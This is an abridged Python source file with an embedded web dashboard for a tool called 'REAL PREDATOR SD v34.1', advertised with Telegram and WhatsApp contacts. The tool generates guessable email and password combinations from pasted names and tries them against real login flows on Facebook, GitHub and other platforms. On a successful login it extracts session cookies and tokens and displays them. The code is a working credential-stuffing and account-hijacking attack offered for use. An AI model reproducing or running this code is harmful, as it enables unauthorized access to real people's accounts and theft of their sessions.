# ================================================================
# REAL PREDATOR SD v34.1 - ULTIMATE HUNTER (FULL)
# Developer: ZERO STORE (Enhanced by @k_p_x1)
# Telegram: @MRDPY | WhatsApp: +249907118667
# ================================================================

import os, sys, re, time, random, threading, requests, json, secrets, urllib3, hashlib, base64
...
class UltimatePredator:
    ...
    def set_names_list(self, names_text):
        """تحديد قائمة الأسماء المراد توليد حسابات منها"""
        with self.lock:
            self.names_list = [n.strip() for n in names_text.split('\n') if n.strip()]
            self.generation_mode = True if self.names_list else False
    
    def generate_accounts_from_names(self):
        """توليد حسابات من قائمة الأسماء مع كلمات مرور ذكية"""
        ...
        name_patterns = [
            lambda n: n.lower(),
            lambda n: n.lower() + '123',
            lambda n: n.lower() + '@2024',
            lambda n: n.lower() + '!' + str(random.randint(1, 99)),
            lambda n: n.lower() + str(random.randint(1, 999)),
            lambda n: n.capitalize(),
            lambda n: n.capitalize() + '123',
            lambda n: n.lower() + '_' + str(random.randint(1, 99)),
            lambda n: n.upper()[:3] + n.lower()[-3:] + str(random.randint(10, 99))
        ]
        ...
        for name in self.names_list:
            ...
            # توليد اسم مستخدم وصيغ مختلفة
            base_name = re.sub(r'[^a-zA-Z0-9]', '', name.lower())
            if not base_name:
                continue
            
            # توليد كلمة مرور من الاسم نفسه
            for pattern in name_patterns[:4]:
                password = pattern(name)
                if len(password) < 6:
                    password = password + '123'
                
                # توليد بريد إلكتروني من الاسم
                email = base_name + '@' + random.choice(domains)
                generated.append((email, password))
                
                # توليد اسم مستخدم مباشر
                generated.append((base_name, password))
                
                # توليد مع أرقام عشوائية
                if len(base_name) > 3:
                    for _ in range(2):
                        suffix = str(random.randint(1, 999))
                        email2 = base_name + suffix + '@' + random.choice(domains)
                        generated.append((email2, password + suffix[:3]))
        
        # إزالة التكرارات
        with self.lock:
            self.generated_accounts = list(dict.fromkeys(generated))
            self.generation_active = True
        
        return self.generated_accounts
    ...
    def smart_hunt_with_tokens(self, username, password):
        """صيد ذكي مع استخراج التوكنات والكوكيز - 100% حقيقي"""
        results = []
        ...
        if self.target_platform:
            ...
            # منصات عالية الخطورة أولاً
            high_risk = [p for p in PLATFORMS if p.get('ban_risk') == 'high']
            low_risk = [p for p in PLATFORMS if p.get('ban_risk') != 'high']
            
            # فلترة حسب نوع المدخل (بريد أو هاتف)
            if is_phone:
                high_risk = [p for p in high_risk if p.get('supports_phone', False)]
                low_risk = [p for p in low_risk if p.get('supports_phone', False)]
            
            random.shuffle(high_risk)
            random.shuffle(low_risk)
            platforms_to_try = high_risk[:5] + low_risk[:10]
        
        # تجربة كل منصة مع استخراج التوكنات
    ...
    def check_tokens_facebook(self, username, password, session):
        try:
            ...
            if 'home.php' in login.url or 'facebook.com/?sk=welcome' in login.url:
                ...
                # محاولة استخراج التوكن من الهيدرز أو الجسم
                token = None
                ...
                return {
                    ...
                    'session_data': {'cookies': cookies, 'headers': dict(session.headers)}
                }
            return None
        except: return None
    ...
    def check_tokens_github(self, username, password, session):
        try:
            ...
            if 'github.com' in login.url and 'login' not in login.url:
                ...
                # استخراج user_session من الكوكيز
        ...
        try:
            ...
            if result.get('json', {}).get('data', {}).get('modhash'):
                ...
                return {
                    ...
                    'cookie': cookie_str,
                    'user_id': username,
                    'session_data': {'cookies': cookies, 'modhash': modhash}
                }
            return None
        except: return None
        ...
        try:
            ...
            if login.status_code == 200:
                ...
                return {
                    ...
                    'session_data': {'cookies': cookies, 'token': token}
                }
            return None
        except: return None
        ...
        try:
            ...
            if login.status_code == 200:
                ...
                return {
                    ...
                    'cookie': cookie_str,
                    'user_id': data.get('user_id', 'N/A'),
                    'session_data': {'cookies': cookies, 'refresh_token': refresh_token}
                }
            return None
        except: return None
    ...
    # Fallback for platforms without specific token extraction
    def check_tokens_default(self, username, password, session):
        # محاولة عامة لجلب الكوكيز
        try:
            cookies = session.cookies.get_dict()
            cookie_str = '; '.join([f'{k}={v}' for k, v in cookies.items()])
            return {
...
def predator_loop():
    ...
    # مؤشر للتحكم في توليد الحسابات
    generation_index = 0
    
    while state['running']:
        try:
            # التحقق من وضع التوليد من القائمة
            if predator.generation_mode and predator.generated_accounts:
                if generation_index < len(predator.generated_accounts):
                    ...
                    with state['lock']:
                        ...
                        state['current_testing'] = [{'username': username, 'platform': 'Generating', 'status': 'testing'}]
                    
                    # تنفيذ الصيد الحقيقي مع التوكنات
                    ...
                    # انتهت القائمة - إعادة تعيين المؤشر
                    if predator.generation_mode:
                        generation_index = 0
                        predator.generation_active = False
                        with state['lock']:
                            state['feed'].append({
                                'type': 'info',
                                'text': f"✅ Completed generation of {len(predator.generated_accounts)} accounts",
                                'time': datetime.now().strftime('%H:%M:%S')
                            })
            else:
                # وضع عادي - تجربة الكومبو
                if predator.combos:
                    ...
                    predator.smart_hunt_with_tokens(f"{name}@{domain}", name + '123')
...
<div class="login-box">
    ...
    <div class="subtitle">⚡ v34.1 ULTIMATE HUNTER</div>
...
<html>
<head><meta charset="UTF-8"><title>REAL PREDATOR SD v34.1</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
...
<div class="container">
    <header class="header">
        <h1>REAL <span>PREDATOR</span> <span class="sd">SD</span> <span style="font-size:12px;color:#006622;">v34.1</span></h1>
    ...
    <!-- ========================================================== -->
    <!-- GENERATION FROM NAMES LIST -->
    <!-- ========================================================== -->
    <div class="generation-box">
        <div class="title"><i class="fas fa-users"></i> GENERATE ACCOUNTS FROM NAMES LIST</div>
        <div class="hint">📝 Paste usernames (one per line) - The system will generate email/password combinations and test them with REAL login + token extraction</div>
    ...
    <div class="card">
        <div style="font-size:12px;color:#ffd700;display:flex;gap:10px;margin-bottom:6px;">
            ...
            <span style="font-size:9px;color:#0088cc;">🎫 Tokens</span>
        </div>
    ...
    <div style="text-align:center;padding:10px;color:#006622;font-size:8px;border-top:1px solid rgba(0,255,65,0.05);margin-top:10px;">
        ⚡ REAL PREDATOR SD v34.1 | {{ platforms|length }} Platforms | Token Extraction | @MRDPY
    </div>
</div>
...
async function updateResults() {
    try {
        ...
        c.innerHTML = d.results.slice(0, 50).map(item => {
            ...
            const tokenDisplay = item.token && item.token !== 'N/A' ? `<div class="token-display">🎫 Token: ${item.token.substring(0, 40)}...</div>` : '';
...
console.log('✅ Dashboard loaded - v34.1');
console.log('✅ Names list generation mode');
console.log('✅ Real login with token/cookie extraction');
console.log('✅ 100% authentic verification');
</script>
</body>
</html>'''
...
def generate_accounts():
    ...
    accounts = predator.generate_accounts_from_names()
    
    if accounts:
        # تحويل القائمة إلى كومبو للاستخدام
...
if __name__ == '__main__':
    ...
    print("""
╔══════════════════════════════════════════════════════════════════════════╗
║   REAL PREDATOR SD v34.1 - ULTIMATE HUNTER                            ║
║   🔥 65+ Platforms with Token Extraction                             ║
...
╚══════════════════════════════════════════════════════════════════════════╝
    ...
    print("[*] GENERATION MODE: Paste names list -> Generate & Test")
    print("[*] REAL LOGIN: Token and Cookie extraction on success")
